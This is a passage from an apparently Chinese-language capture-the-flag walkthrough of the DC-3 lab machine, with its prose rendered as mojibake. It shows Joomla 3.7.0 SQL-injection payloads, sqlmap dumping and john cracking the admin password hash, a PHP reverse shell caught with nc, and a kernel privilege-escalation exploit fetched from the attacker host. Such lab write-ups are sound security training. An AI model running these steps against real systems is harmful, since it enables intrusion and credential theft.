latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-generator: Joomla! - Open Source Content Management<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Home<br>MAC Address: 00:0C:29:DD:1F:45 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.53 ms 192.168.135.153 (192.168.135.153)<br><br>Nmap done: 1 IP address (1 host up) scanned in 12.92 seconds<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>å…¶ä»–</th></tr></thead><tbody><tr><td>80/tcp</td><td>open</td><td>http</td><td>Joomla! - Open Source Content Management</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>80ç«¯å£</strong></p><p>è®¿é—®ï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Welcome <span class="hljs-keyword">to</span> DC<span class="hljs-number">-3.</span><br>This <span class="hljs-built_in">time</span>, there <span class="hljs-keyword">is</span> only one flag, one entry point <span class="hljs-keyword">and</span> no clues.<br>To <span class="hljs-keyword">get</span> <span class="hljs-keyword">the</span> flag, you&#x27;ll obviously have <span class="hljs-keyword">to</span> gain root privileges.<br>How you <span class="hljs-keyword">get</span> <span class="hljs-keyword">to</span> be root <span class="hljs-keyword">is</span> up <span class="hljs-keyword">to</span> you - <span class="hljs-keyword">and</span>, obviously, <span class="hljs-keyword">the</span> system.<br>Good luck - <span class="hljs-keyword">and</span> I hope you enjoy this little challenge.  :-)<br></code></pre></td></tr></table></figure><p>è¿›è¡Œç›®å½•çˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.153</span><br><br>---- Scanning URL: http://192.168.135.153/ ----<br>==&gt; DIRECTORY: http://192.168.135.153/administrator/<br>==&gt; DIRECTORY: http://192.168.135.153/bin/<br>==&gt; DIRECTORY: http://192.168.135.153/cache/<br>==&gt; DIRECTORY: http://192.168.135.153/components/<br>==&gt; DIRECTORY: http://192.168.135.153/images/<br>==&gt; DIRECTORY: http://192.168.135.153/includes/<br>+ http://192.168.135.153/index.php (CODE:200|SIZE:7110)<br>==&gt; DIRECTORY: http://192.168.135.153/language/<br>==&gt; DIRECTORY: http://192.168.135.153/layouts/<br>==&gt; DIRECTORY: http://192.168.135.153/libraries/<br>==&gt; DIRECTORY: http://192.168.135.153/media/<br>==&gt; DIRECTORY: http://192.168.135.153/modules/<br>==&gt; DIRECTORY: http://192.168.135.153/plugins/<br>+ http://192.168.135.153/server-status (CODE:403|SIZE:303)<br>==&gt; DIRECTORY: http://192.168.135.153/templates/<br>==&gt; DIRECTORY: http://192.168.135.153/tmp/<br></code></pre></td></tr></table></figure><p>joomscan æ‰«æï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> joomscan -u 192.168.135.153</span><br>Processing http://192.168.135.153 ...<br><br>[+] FireWall Detector<br>[++] Firewall not detected<br><br>[+] Detecting Joomla Version<br>[++] Joomla 3.7.0<br><br>[+] Core Joomla Vulnerability<br>[++] Target Joomla core is not vulnerable<br><br>[+] Checking Directory Listing<br>[++] directory has directory listing : <br>http://192.168.135.153/administrator/components<br>http://192.168.135.153/administrator/modules<br>http://192.168.135.153/administrator/templates<br>http://192.168.135.153/images/banners<br><br>[+] Checking apache info/status files<br>[++] Readable info/status files are not found<br><br>[+] admin finder<br>[++] Admin page : http://192.168.135.153/administrator/<br><br>[+] Checking robots.txt existing<br>[++] robots.txt is not found<br><br>[+] Finding common backup files name<br>[++] Backup files are not found<br><br>[+] Finding common log files name<br>[++] error log is not found<br><br>[+] Checking sensitive config.php.x file<br>[++] Readable config files are not found<br><br>Your Report : reports/192.168.135.153/<br></code></pre></td></tr></table></figure><p>å¾—åˆ° Joomla ç‰ˆæœ¬ä¸ºï¼š3.7.0 ã€‚</p><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>æŸ¥æ‰¾åˆ©ç”¨è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit joomla 3.7.0</span><br>-------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                            |  Path<br>-------------------------------------------------------------------------- ---------------------------------<br>Joomla! 3.7.0 - &#x27;com_fields&#x27; SQL Injection                                | php/webapps/42033.txt<br>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting             | php/webapps/43488.txt<br>-------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br><span class="hljs-meta">#</span><span class="bash"> Exploit Title: Joomla 3.7.0 - Sql Injection</span><br><span class="hljs-meta">#</span><span class="bash"> Date: 05-19-2017</span><br><span class="hljs-meta">#</span><span class="bash"> Exploit Author: Mateus Lino</span><br><span class="hljs-meta">#</span><span class="bash"> Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span><br><span class="hljs-meta">#</span><span class="bash"> Vendor Homepage: https://www.joomla.org/</span><br><span class="hljs-meta">#</span><span class="bash"> Version: = 3.7.0</span><br><span class="hljs-meta">#</span><span class="bash"> Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span><br><span class="hljs-meta">#</span><span class="bash"> CVE : - CVE-2017-8917</span><br><br><br>URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27<br><br><br>Using Sqlmap: <br><br>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br><br><br>Parameter: list[fullordering] (GET)<br>    Type: boolean-based blind<br>    Title: Boolean-based blind - Parameter replace (DUAL)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)<br><br>    Type: error-based<br>    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)<br><br>    Type: AND/OR time-based blind<br>    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)<br></code></pre></td></tr></table></figure><p>è®¿é—®è¯•ä¸€ä¸‹ï¼Œçš„ç¡®å­˜åœ¨ SQL æ³¨å…¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> http://192.168.135.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br><br>500 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;\&#x27;&#x27; at line 9<br></code></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨ sqlmap ï¼š </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap -u <span class="hljs-string">&quot;http://192.168.135.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br>[09:39:59] [INFO] fetching database names<br>[09:39:59] [INFO] retrieved: &#x27;information_schema&#x27;<br>[09:39:59] [INFO] retrieved: &#x27;joomladb&#x27;<br>[09:39:59] [INFO] retrieved: &#x27;mysql&#x27;<br>[09:39:59] [INFO] retrieved: &#x27;performance_schema&#x27;<br>[09:39:59] [INFO] retrieved: &#x27;sys&#x27;<br>available databases [5]:<br>[*] information_schema<br>[*] joomladb<br>[*] mysql<br>[*] performance_schema<br>[*] sys<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾å½“å‰åº“åï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap -u <span class="hljs-string">&quot;http://192.168.135.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --current-db -p list[fullordering]</span><br>[09:43:57] [INFO] fetching current database<br>[09:43:57] [INFO] retrieved: &#x27;joomladb&#x27;<br>current database: &#x27;joomladb&#x27;<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾ joomladb æ•°æ®åº“çš„è¡¨åï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap -u <span class="hljs-string">&quot;http://192.168.135.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="hljs-string">&quot;joomladb&quot;</span> --tables  -p list[fullordering]</span><br>[09:45:34] [INFO] fetching tables for database: &#x27;joomladb&#x27;<br>[......]<br>[09:45:37] [INFO] retrieved: &#x27;#__user_keys&#x27;<br>[09:45:37] [INFO] retrieved: &#x27;#__user_notes&#x27;<br>[09:45:37] [INFO] retrieved: &#x27;#__user_profiles&#x27;<br>[09:45:37] [INFO] retrieved: &#x27;#__user_usergroup_m&#x27;<br>[09:45:37] [INFO] retrieved: &#x27;#__usergroups&#x27;<br>[09:45:37] [INFO] retrieved: &#x27;#__users&#x27;<br>[......]<br>Database: joomladb<br>[76 tables]<br>+---------------------+<br>| [......]            |<br>| #__user_keys        |<br>| #__user_notes       |<br>| #__user_profiles    |<br>| #__user_usergroup_m |<br>| #__usergroups       |<br>| #__users            |<br>| [......]            |<br>+---------------------+<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾ __users è¡¨çš„å±æ€§åï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap -u <span class="hljs-string">&quot;http://192.168.135.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="hljs-string">&quot;joomladb&quot;</span> -T <span class="hljs-string">&quot;#__users&quot;</span> --columns  -p list[fullordering]</span><br>[09:47:55] [INFO] fetching columns for table &#x27;#__users&#x27; in database &#x27;joomladb&#x27;<br>[09:47:55] [WARNING] unable to retrieve column names for table &#x27;#__users&#x27; in database &#x27;joomladb&#x27;<br>do you want to use common column existence check? [y/N/q] y<br>[09:47:57] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &#x27;--no-cast&#x27; or switch &#x27;--hex&#x27;<br>which common columns (wordlist) file do you want to use?<br>[1] default &#x27;/usr/share/sqlmap/data/txt/common-columns.txt&#x27; (press Enter)<br>[2] custom<br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>[09:48:38] [INFO] checking column existence using items from &#x27;/usr/share/sqlmap/data/txt/common-columns.txt&#x27;<br>[09:48:38] [INFO] adding words used on web page to the check list<br>please enter number of threads? [Enter for 1 (current)] <br>[09:48:48] [WARNING] running in a single-thread mode. This could take a while<br>[09:48:48] [INFO] retrieved: id<br>[09:48:48] [INFO] retrieved: name<br>[09:48:48] [INFO] retrieved: username<br>[09:48:48] [INFO] retrieved: email<br>[09:48:51] [INFO] retrieved: password<br>[09:49:29] [INFO] retrieved: params<br><br>Database: joomladb<br>Table: #__users<br>[6 columns]<br>+----------+-------------+<br>| Column   | Type        |<br>+----------+-------------+<br>| email    | non-numeric |<br>| id       | numeric     |<br>| name     | non-numeric |<br>| params   | non-numeric |<br>| password | non-numeric |<br>| username | non-numeric |<br>+----------+-------------+<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾ __users è¡¨çš„ç”¨æˆ·åå’Œå¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap  -u <span class="hljs-string">&quot;http://192.168.135.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="hljs-string">&quot;joomladb&quot;</span> -T <span class="hljs-string">&quot;#__users&quot;</span> -C <span class="hljs-string">&quot;name,password&quot;</span> --dump  -p list[fullordering]</span><br>[09:50:06] [INFO] fetching entries of column(s) &#x27;name,password&#x27; for table &#x27;#__users&#x27; in database &#x27;joomladb&#x27;<br>[09:50:06] [INFO] retrieved: &#x27;admin&#x27;<br>[09:50:06] [INFO] retrieved: &#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;<br>Database: joomladb<br>Table: #__users<br>[1 entry]<br>+-------+--------------------------------------------------------------+<br>| name  | password                                                     |<br>+-------+--------------------------------------------------------------+<br>| admin | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |<br>+-------+--------------------------------------------------------------+<br></code></pre></td></tr></table></figure><p>john è§£å¯†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;</span> &gt; passwd</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john passwd</span>                                                      <br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>Almost done: Processing the remaining buffered candidate passwords, if any.<br>Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist<br>snoopy           (?)<br>Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br>Session completed<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://192.168.135.153/administrator/</code> ï¼Œç™»å½•åæŸ¥çœ‹åå°ï¼Œåœ¨ <code>templates: templates</code> å‘ç°å¯ä»¥ä¿®æ”¹æ–‡ä»¶å’Œåˆ›å»ºæ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">CONFIGURATION--Templates--Templates--Beez3 Details and Files--index.php<br></code></pre></td></tr></table></figure><p>ç›´æ¥åˆ›å»ºä¸€ä¸ª shell.phpï¼Œå°†åå¼¹ shell å†™è¿›å»ï¼Œå†åŠ ä¸€ä¸ªæ ‡è¯† <code>this is a shell</code> ï¼Œæ–¹ä¾¿æŸ¥æ‰¾æ–‡ä»¶ä½ç½® ã€‚</p><p>è®¿é—® <code>http://192.168.135.153/templates/beez3/shell.php</code> ï¼Œå‘ç°æ˜¯æˆ‘ä»¬å†™çš„ shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">this is a shell WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111)<br></code></pre></td></tr></table></figure><p>kali ç›‘å¬ï¼Œå¾—åˆ° shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.153] 46398<br>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux<br> 00:58:50 up  2:28,  0 users,  load average: 0.02, 0.02, 0.05<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><p>æŸ¥çœ‹å†…æ ¸ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> uname -a</span><br>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux<br><span class="hljs-meta">$</span><span class="bash"> lsb_release -a</span><br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 16.04 LTS<br>Release:        16.04<br>Codename:       xenial<br></code></pre></td></tr></table></figure><p>åœ¨ searchploit å¯»æ‰¾å…³äº ubuntu16.04 çš„æƒé™æå‡çš„æ¼æ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit ubuntu 16.04 Privilege Escalation linux</span> <br>Exploit Title: Linux Kernel 4.4.x (Ubuntu 16.04) - &#x27;double-fdput()&#x27; bpf(BPF_PROG_LOAD) Privilege Escalation<br>Path: linux/local/39772.txt<br></code></pre></td></tr></table></figure><p>æ‰“å¼€æ–‡ä»¶æŸ¥çœ‹æ¼æ´å…·ä½“åˆ©ç”¨æ–¹æ³•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/39772.txt</span><br><br>An exploit that puts all this together is in exploit.tar. Usage:<br><br>user@host:~/ebpf_mapfd_doubleput$ ./compile.sh<br>user@host:~/ebpf_mapfd_doubleput$ ./doubleput<br>starting writev<br>woohoo, got pointer reuse<br>writev returned successfully. if this worked, you&#x27;ll have a root shell in &lt;=60 seconds.<br>suid file detected, launching rootshell...<br>we have root privs now...<br>root@host:~/ebpf_mapfd_doubleput# id<br>uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)<br><br>This exploit was tested on a Ubuntu 16.04 Desktop system.<br><br>Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7<br><br><br>Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552<br>Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip     <br></code></pre></td></tr></table></figure><p>ä¸‹è½½ exp åˆ° dc3 çš„æœ¬åœ°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br>--2022-07-04 01:14:31--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip<br>Resolving github.com (github.com)... 20.205.243.166<br>Connecting to github.com (github.com)|20.205.243.166|:443... connected.<br>Unable to establish SSL connection.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br>--2022-07-04 01:16:17--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip<br>Resolving github.com (github.com)... 20.205.243.166<br>Connecting to github.com (github.com)|20.205.243.166|:443... failed: Connection refused.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/39772.zip</span>    <br>--2022-07-04 01:19:36--  http://192.168.135.141:8888/39772.zip<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 7025 (6.9K) [application/zip]<br>39772.zip: Permission denied<br><br>Cannot write to &#x27;39772.zip&#x27; (Success).<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>[......]<br>drwxrwxrwt   9 root root  4096 Jul  4 17:48 tmp<br>[......]<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /tmp</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/39772.zip</span>    <br>--2022-07-04 17:48:40--  http://192.168.135.141:8888/39772.zip<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 7025 (6.9K) [application/zip]<br>Saving to: &#x27;39772.zip&#x27;<br><br>     0K ......                                                100% 18.4M=0s<br><br>2022-07-04 17:48:40 (18.4 MB/s) - &#x27;39772.zip&#x27; saved [7025/7025]<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>39772.zip<br>systemd-private-3fa2825cd4ff47fbb6b4b797e59e4504-systemd-timesyncd.service-oDSbXI<br>vmware-root<br></code></pre></td></tr></table></figure><p>è§£å‹ï¼š</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 